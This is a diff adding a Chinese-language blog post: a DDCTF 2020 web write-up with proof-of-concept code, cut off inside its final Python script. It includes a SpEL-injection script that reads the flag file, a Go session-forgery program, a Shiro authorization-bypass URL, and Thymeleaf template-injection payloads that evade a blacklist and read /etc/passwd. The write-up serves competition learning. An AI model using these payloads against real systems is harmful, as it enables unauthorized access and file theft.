@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="DDCTF 2020 WEB WriteUp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF 2020 WEB WriteUp">
+<meta property="og:url" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="DDCTF 2020 WEB WriteUp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200904205954880.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200906011150956.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200906011338970.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200904205228577.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905145712350.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905150124229.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905150749583.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905151511297.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905151740145.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905152033326.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905152731294.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905152908078.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905151213122.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908160754830.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908162950387.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908163055003.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908163122104.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905185300895.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905230759614.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200910220826959.png">
+<meta property="article:published_time" content="2020-09-04T12:38:03.000Z">
+<meta property="article:modified_time" content="2022-05-21T05:27:41.520Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200904205954880.png">
+
+
+<link rel="canonical" href="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/","path":"2020/09/04/DDCTF-2020-WEB-WriteUp/","title":"DDCTF 2020 WEB WriteUp"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>DDCTF 2020 WEB WriteUp | l3yx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">l3yx's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">Web签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%A1%E7%89%87%E5%95%86%E5%BA%97"><span class="nav-number">2.</span> <span class="nav-text">卡片商店</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-Web"><span class="nav-number">3.</span> <span class="nav-text">Easy Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Overwrite-Me"><span class="nav-number">4.</span> <span class="nav-text">Overwrite Me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="淚笑"
+      src="/resources/avatar.jpg">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/resources/avatar.jpg">
+      <meta itemprop="name" content="淚笑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+      <meta itemprop="description" content="学的越多，懂的越少">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="DDCTF 2020 WEB WriteUp | l3yx's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DDCTF 2020 WEB WriteUp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-09-04 20:38:03" itemprop="dateCreated datePublished" datetime="2020-09-04T20:38:03+08:00">2020-09-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-21 13:27:41" itemprop="dateModified" datetime="2022-05-21T13:27:41+08:00">2022-05-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>DDCTF 2020 WEB WriteUp</p>
+<span id="more"></span>
+
+<h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200904205954880.png" alt="image-20200904205954880"></p>
+<p>第一个POST传入username和pwd会返回token，第二个POST传入username，pwd和token会得到client下载链接，但第二个POST直接提交是提示need ADMIN permission，看来需要伪造JWT，一开始利用<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>爆破很久都没成功，后来队友成功了，发现secret key就是第一个POST包中自己传入的pwd，而我是因为一开始填的pwd太复杂…</p>
+<p>将JWT中的userRole修改为ADMIN POST到<code>/admin/auth</code>得到client下载地址</p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200906011150956.png" alt="image-20200906011150956"></p>
+<p>clinet向服务器发送command，可以在命令行<code>export http_proxy=ip:port</code>设置代理，burp抓包</p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200906011338970.png" alt="image-20200906011338970"></p>
+<p>需要先解决的是signature的算法，队友逆出签名计算方法为 HMAC sha256 加密 <code>command|time_stamp</code> 后base64编码，HMAC加密的密钥为DDCTFWithYou</p>
+<p>然后测试了很久发现是可以注入SPEL表达式，最终POC:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSignature</span>(<span class="params">command,time</span>):</span><br><span class="line">    command=urllib.parse.quote(command)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;1024tools.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://1024tools.com/hmac&quot;</span></span><br><span class="line">    data=<span class="string">&quot;query=&quot;</span>+command+<span class="string">&quot;|&quot;</span>+time+<span class="string">&quot;&amp;algo=sha256&amp;key=DDCTFWithYou&quot;</span></span><br><span class="line">    res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">    r=re.<span class="built_in">compile</span>(<span class="string">&#x27;B:（HMAC(.*?)&lt;textarea class=&quot;form-control&quot; id=&quot;result_base64&quot; rows=&quot;2&quot; spellcheck=&quot;false&quot; name=&quot;result&quot; cols=&quot;50&quot;&gt;(.*?)&lt;/textarea&gt;&#x27;</span>,re.DOTALL)</span><br><span class="line">    <span class="keyword">return</span> r.search(res.text).group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendCommand</span>(<span class="params">command,time</span>):</span><br><span class="line">    signature = getSignature(command,time)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;117.51.136.197&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;http://117.51.136.197/server/command&quot;</span></span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;signature&quot;:&quot;&#x27;</span>+signature+<span class="string">&#x27;&quot;,&quot;command&quot;:&quot;&#x27;</span>+command+<span class="string">&#x27;&quot;,&quot;timestamp&quot;:&#x27;</span>+time+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;T(java.nio.file.Files).lines(T(java.nio.file.Paths).get(&#x27;/home/dc2-user/flag/flag.txt&#x27;))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(sendCommand(command,<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h2><p>借入卡片的时候有溢出漏洞，借入1000000000000，账户立即入账1000000000000，但只需还3567587330，然后兑换礼物</p>
+<p>得到提示</p>
+<blockquote>
+<p>url: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12</p>
+</blockquote>
+<p>由cookie中session的特征一顿百度谷歌后，确定了是来自Golang的securecookie，<code>Udc13VD5adM_c10nPxFu@v12</code>是密钥，应该是需要伪造session中的某些字段（这里是将admin设为true），POC如下</p>
+<p>（session base64解码后是明文数据，所以<code>securecookie.New(hashKey, nil)</code>第二个参数应该传入nil，至于map[interface{}]interface{}这个结构的构造，由于不太懂Golang，是观察session base64解密后的明文试了很久才得出的）</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">//go get github.com/gorilla/sessions</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/gorilla/securecookie&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hashKey = []<span class="type">byte</span>(<span class="string">&quot;Udc13VD5adM_c10nPxFu@v12&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> s = securecookie.New(hashKey, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  encode()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">encode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  value := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125; &#123;<span class="string">&quot;admin&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;wallet&quot;</span>:<span class="string">&quot;&#123;\&quot;owings\&quot;:[],\&quot;invests\&quot;:[],\&quot;money\&quot;:996432412472,\&quot;now_time\&quot;:1599208994,\&quot;start_time\&quot;:1599208954&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">  encoded, err := s.Encode(<span class="string">&quot;session&quot;</span>, value)</span><br><span class="line">  <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(encoded)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  value := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">  <span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> err = s.Decode(<span class="string">&quot;session&quot;</span>, <span class="string">&quot;MTU5OTIwOTAzNHxEdi1CQkFFQ180SUFBUkFCRUFBQV81Yl9nZ0FDQm5OMGNtbHVad3dIQUFWaFpHMXBiZ1JpYjI5c0FnSUFBQVp6ZEhKcGJtY01DQUFHZDJGc2JHVjBCbk4wY21sdVp3eGZBRjE3SW05M2FXNW5jeUk2VzEwc0ltbHVkbVZ6ZEhNaU9sdGRMQ0p0YjI1bGVTSTZPVGsyTkRNeU5ERXlORGN5TENKdWIzZGZkR2x0WlNJNk1UVTVPVEl3T0RrNU5Dd2ljM1JoY25SZmRHbHRaU0k2TVRVNU9USXdPRGsxTkgwPXyt-B6Jm23Kk8B5z2K_UKTx67JL4Qxam0wgJg3Oh7H38w==&quot;</span>, &amp;value); err == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(value)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后带上伪造的session访问<code>/flag</code></p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200904205228577.png" alt="image-20200904205228577"></p>
+<h2 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h2><p>这题从早上一直肝到下午，终于拿到一血，感觉对Java知识点考察很多</p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905145712350.png" alt="image-20200905145712350"></p>
+<p>抓包发现有rememberMe&#x3D;deleteMe，第一反应是Shiro反序列化漏洞，拿Xray跑了一波常用key无果，就又尝试了Shiro的权限绕过漏洞，成功访问到index路由</p>
+<p><a href="https://l3yx.github.io/2020/06/30/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/">CVE-2020-11989</a></p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905150124229.png" alt="image-20200905150124229"></p>
+<p>在网页源码中发现文件下载接口<code>./img?img=static/hello.jpg</code>，然后此时的思路就是读配置文件，读class文件，审计，找洞</p>
+<p>WEB项目首先是<code>WEB-INF/web.xml</code></p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905150749583.png" alt="image-20200905150749583"></p>
+<p>比较有用的是这俩spring的配置，这里classpath是指WEB-INF目录下的classes目录</p>
+<p><code>WEB-INF/classes/spring-web.xml</code></p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905151511297.png" alt="image-20200905151511297"></p>
+<p>拿到了项目部分包名，后面读取class文件时需要（包名对应路径）</p>
+<p><code>WEB-INF/classes/spring-core.xml</code></p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905151740145.png" alt="image-20200905151740145"></p>
+<p>其实看到有个模板引擎thymeleaf就猜到后面可能要考Java的模板注入</p>
+<p><code>WEB-INF/classes/spring-shiro.xml</code></p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905152033326.png" alt="image-20200905152033326"></p>
+<p>得到一个类名，那就可以读取class文件了</p>
+<p><code>WEB-INF/classes/com/ctf/auth/ShiroRealm.class</code></p>
+<p>然后反编译根据Java代码中的import的类去读取了其他class，但没有具体进展，最后是由命名规则猜测文件名得到了<code>WEB-INF/classes/com/ctf/controller/AuthController.class</code></p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905152731294.png" alt="image-20200905152731294"></p>
+<p>是admin的话重定向到这个路由，那么直接利用Shiro权限绕过漏洞访问</p>
+<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index</a></p>
+<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905152908078.png" alt="image-20200905152908078"></p>
+<p>没错就是考察的thymeleaf模板注入，不过这里貌似有黑名单，具体表现就是不能出现引号，也就是说字符串要另外想办法构造，不能出现某些方法的关键字，比如File类中的readXxx方法，反射中的invoke方法，导致没办法用常规办法执行命令和读取文件，也不能通过反射动态调用被ban的方法。</p>
+<p>后面很多时间都是在绕这里的限制，最后的解决方法就是</p>
+<p>字符串通过字符拼接来构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">th:value</span>=<span class="string">$&#123;T(com.ctf.model.User).getName()[3].replace(46,108)+T(com.ctf.model.User).getName()[3].replace(46,51)+T(com.ctf.model.User).getName()[3].replace(46,121)+T(com.ctf.model.User).getName()[3].replace(46,120)&#125;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>防止类名被ban，使用getClassLoader的loadClass动态加载所需类</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">th:value</span>=<span class="string">$&#123;T(com.ctf.model.User).getClassLoader().loadClass(类名字符串)&#125;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用Files类的list和lines方法列举和读取文件，使用toArray() 和 Arrays.toString() 把内容流转换为字符串输出</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Arrays.toString( java.nio.file.Files.list(java.nio.file.Paths.get(<span class="string">&quot;/&quot;</span>)).toArray() );</span><br><span class="line">Arrays.toString( java.nio.file.Files.lines(java.nio.file.Paths.get(<span class="string">&quot;/etc/passwd&quot;</span>)).toArray() );</span><br></pre></td></tr></table></figure>
+
+<p>最后POC如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;116.85.37.131&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://116.85.37.131&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] submit...&quot;</span>)</span><br><span class="line">    url = <span 